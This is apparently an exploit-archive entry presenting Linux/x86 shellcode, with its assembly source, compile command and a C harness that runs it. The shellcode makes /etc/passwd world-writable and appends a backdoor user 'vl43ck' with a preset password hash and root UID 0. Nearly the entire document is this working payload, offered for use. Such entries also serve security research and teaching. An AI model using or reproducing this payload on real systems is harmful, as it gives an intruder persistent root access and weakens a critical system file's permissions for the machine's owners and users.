# Exploit Title: Linux/x86 -  Add User to /etc/passwd Shellcode (59 bytes)
# Date: 2019-10-05
# Exploit Author: sagar.offsec (VL43CK)
# Guided by: Touhid M.Shaikh
# Designation: Security Consultant at SecureLayer7
# Website: https://www.sagaroffsec.com
# Tested on: Ubuntu i386 GNU/LINUX
# Shellcode Length: 59

----------------------(DESCRIPTION)----------------------------

This shellcode will first change /etc/passwd permission to 777 and then
add a user "vl43ck" in it with password "test" with root permissions.

----------------------(SHELLCODE DUMP)-------------------------
global _start

section .text
_start:

	;chmod 777 /etc/passwd

	xor eax, eax
	push eax

	push 0x64777373
	push 0x61702f63
	push 0x74652f2f
	xor ebx, ebp
	lea ebx, [esp]

	xor ecx, ecx
	mov cx, 0x1ff

	mov al, 0xf
	int 0x80

	;add user in /etc/passwd

	;open /etc/passwd

	xor eax, eax
	mov al, 5
	xor ecx, ecx
	mov cx, 2001Q
	int 0x80

	;write into /etc/passwd

	xor ebx, ebx
	mov ebx, eax

	jmp short call_write
write:
	pop ecx

	xor eax, eax
	xor edx, edx
	mov dx, 132
	mov al, 4
	int 0x80

	; close /etc/passwd

	xor eax, eax
	mov al, 6
	int 0x80

	;exit gracefully

	push eax
	xor eax, eax
	mov al, 1
	xor ebx, ebx
	pop ebx
	int 0x80

call_write:

	call write
	shellcode: db "vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash"


----------------------(COMPILE)-------------------------

gcc -m32 -fno-stack-protector -z execstack -o shellcode shellcode.c

----------------------(C-Code)--------------------------

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x31\xeb\x8d\x1c\x24\x31\xc9\x66\xb9\xff\x01\xb0\x0f\xcd\x80\x31\xc0\xb0\x05\x31\xc9\x66\xb9\x01\x04\xcd\x80\x31\xdb\x89\xc3\xeb\x1d\x59\x31\xc0\x31\xd2\x66\xba\x84\x00\xb0\x04\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x50\x31\xc0\xb0\x01\x31\xdb\x5b\xcd\x80\xe8\xde\xff\xff\xff\x76\x6c\x34\x33\x63\x6b\x3a\x24\x36\x24\x62\x78\x77\x4a\x66\x7a\x6f\x72\x24\x4d\x55\x68\x55\x57\x4f\x30\x4d\x55\x67\x64\x6b\x57\x66\x50\x50\x45\x79\x64\x71\x67\x5a\x70\x6d\x2e\x59\x74\x50\x4d\x49\x2f\x67\x61\x4d\x34\x6c\x56\x71\x68\x50\x32\x31\x4c\x46\x4e\x57\x6d\x53\x4a\x38\x32\x31\x6b\x76\x4a\x6e\x49\x79\x6f\x4f\x44\x59\x74\x42\x68\x2e\x53\x46\x39\x61\x52\x37\x63\x69\x51\x42\x52\x43\x63\x77\x35\x62\x67\x6a\x58\x30\x3a\x30\x3a\x30\x3a\x76\x6c\x34\x33\x63\x6b\x3a\x2f\x74\x6d\x70\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}